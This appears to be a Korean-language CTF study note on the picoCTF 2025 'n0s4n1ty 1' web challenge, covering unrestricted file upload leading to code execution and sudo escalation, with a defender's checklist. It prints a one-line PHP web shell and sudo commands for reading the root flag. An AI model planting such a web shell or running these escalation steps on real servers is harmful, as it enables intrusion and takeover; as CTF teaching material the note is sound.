---
title: n0s4n1ty 1 — picoCTF 2025 web writeup
created: 2026-06-14
updated: 2026-06-14
type: query
tags: [ctf, web, research, writeup, file-upload, rce, privilege-escalation]
sources: [https://github.com/snwau/picoCTF-2025-Writeup/blob/main/Web%20Exploitation/n0s4n1ty%201/n0s4n1ty%201.md, https://medium.com/@pragusga/picoctf-2025-n0s4n1ty-1-file-upload-to-rce-82f458e7706a, https://medium.com/@inferiorak/n0s4n1ty-1-web-exploitation-picoctf-2025-edcde6045088, https://www.youtube.com/watch?v=duP8S-IqVuQ]
confidence: medium
---

# n0s4n1ty 1 — picoCTF 2025 web writeup

> 프로필 사진 업로드 기능처럼 보이는 입력 지점에서 파일 업로드 검증이 약하고, 업로드된 파일이 실제로 실행되어 RCE와 권한 상승으로 이어지는 picoCTF 2025 Web Exploitation 문제입니다.

## 1. 핵심 요약

- 이 문제는 **파일 업로드 검증**과 **업로드 파일 실행 가능성**을 확인하는 전형적인 Web CTF입니다.
- 업로드 경로가 외부에 노출되어 있으면, 단순 저장이 아니라 **직접 접근/실행** 가능성을 먼저 봐야 합니다.
- 최종적으로는 업로드한 PHP 웹셸을 통해 명령 실행이 가능하고, 이어서 `sudo` 권한을 확인해 `/root/flag.txt` 접근으로 이어집니다.

연결 개념: [[file-upload-ctf-patterns]], [[rce]], [[command-injection]], [[web-ctf-master-checklist]]

## 2. 문제 흐름

| 단계 | 관찰 | 의미 |
|------|------|------|
| 1 | 프로필 이미지 업로드 기능이 보임 | 정상 기능처럼 보이지만 공격면 후보입니다 |
| 2 | 업로드 경로가 응답에 노출됨 | 업로드 파일이 직접 서빙될 가능성이 있습니다 |
| 3 | PHP 파일을 올렸을 때 `cmd=id`가 실행됨 | 업로드 파일이 실행됩니다 |
| 4 | `sudo -l` 결과에서 강한 권한이 드러남 | 권한 상승 가능성을 점검합니다 |
| 5 | `sudo cat /root/flag.txt`로 flag 접근 | 최종 획득 경로입니다 |

## 3. 공격자 관점

### 3.1 업로드 경로 확인
```text
# 업로드 응답에서 실제 저장 위치를 확인합니다.
# 예상 결과: /uploads/<filename> 같은 직접 접근 경로가 보일 수 있습니다.
```

### 3.2 웹셸 업로드
```php
<?php
// 업로드 파일이 실행되는지 확인하는 최소 웹셸 예시입니다.
// 예상 결과: ?cmd=id 호출 시 현재 사용자 권한이 출력됩니다.
system($_GET['cmd']);
?>
```

### 3.3 권한 확인
```bash
# 서버에서 sudo 권한을 확인하는 예시입니다.
# 예상 결과: NOPASSWD 항목이 보이면 임의 명령 실행이 가능합니다.
sudo -l
```

## 4. 방어자 관점

1. 파일 확장자와 MIME 타입을 함께 검증합니다.
2. 업로드 파일을 웹 루트에서 분리합니다.
3. 업로드 파일의 실행 권한을 제거합니다.
4. 랜덤 파일명과 재인코딩을 사용합니다.
5. `sudo` 권한은 최소화하고 `NOPASSWD: ALL` 같은 설정을 제거합니다.

## 5. 실전에서 확인할 포인트

- 업로드 경로가 HTML에 그대로 노출되는지
- 이미지로만 보이지만 실제로는 코드가 실행되는지
- 확장자 검증이 `.php`, `.phtml`, `.php5` 등을 막는지
- 업로드된 파일이 정적 서빙인지 동적 실행인지
- 업로드 이후 로컬 권한 상승 단서가 있는지

## 6. 같이 보면 좋은 페이지

- [[file-upload-ctf-patterns]] — 파일 업로드 CTF 패턴
- [[file-upload-defense]] — 서버측 방어 포인트
- [[rce]] — 원격 코드 실행 개념
- [[command-injection]] — 명령 실행 계열 문제와 비교
- [[web-ctf-writeup-storage-upload]] — 업로드/스토리지 허브

## 7. 참고 소스

- [snwau picoCTF-2025 Writeup](https://github.com/snwau/picoCTF-2025-Writeup/blob/main/Web%20Exploitation/n0s4n1ty%201/n0s4n1ty%201.md)
- [n0s4n1ty 1 — Web Exploitation — picoCTF 2025](https://medium.com/@pragusga/picoctf-2025-n0s4n1ty-1-file-upload-to-rce-82f458e7706a)
- [n0s4n1ty 1 — Web Exploitation — picoCTF 2025](https://medium.com/@inferiorak/n0s4n1ty-1-web-exploitation-picoctf-2025-edcde6045088)
- [picoGym (picoCTF) Exercise: n0s4n1ty 1](https://www.youtube.com/watch?v=duP8S-IqVuQ)
